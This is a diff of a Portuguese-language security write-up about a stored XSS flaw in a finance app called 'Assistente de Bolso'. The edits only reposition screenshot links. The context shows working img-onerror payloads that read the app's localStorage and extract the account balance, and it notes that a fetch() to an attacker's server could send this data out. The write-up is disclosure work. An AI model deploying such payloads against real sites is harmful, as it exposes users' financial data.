@@ -2,6 +2,7 @@
 layout: writeup
 title: "Stored XSS em Assistente de Bolso"
 ---
+
 # Stored XSS em "Assistente de Bolso" — Exfiltração de Dados Financeiros via localStorage
 
 **Data:** Agosto 2026
@@ -39,10 +40,14 @@ O payload evoluiu em etapas progressivas, cada uma demonstrando um nível maior 
 <img src=x onerror="alert('Dados que vazariam: ' + localStorage.getItem('assistente-financeiro-state').substring(0,150))">
 ```
 
+![PoC - Alert exibindo dados do localStorage vazando](xss-poc2.png)
+
 **3. Extração direcionada do dado crítico (saldo da conta):**
 ```html
 <img src=x onerror="alert('Saldo exposto: ' + JSON.parse(localStorage.getItem('assistente-financeiro-state')).initialBalance)">
 ```
+
+![PoC - Saldo exposto](xss-poc.png)
 
 **4. Simulação de exfiltração real (como um atacante faria de verdade):**
 ```html
@@ -50,8 +55,6 @@ O payload evoluiu em etapas progressivas, cada uma demonstrando um nível maior 
 ```
 
 Em um cenário de ataque real, o `alert()` / `console.log()` seria substituído por um `fetch()` enviando o conteúdo do `localStorage` para um servidor controlado pelo atacante — sem qualquer indício visível para a vítima.
-
-**![PoC - Saldo exposto](xss-poc.png)**
 
 ## Causa Raiz
 
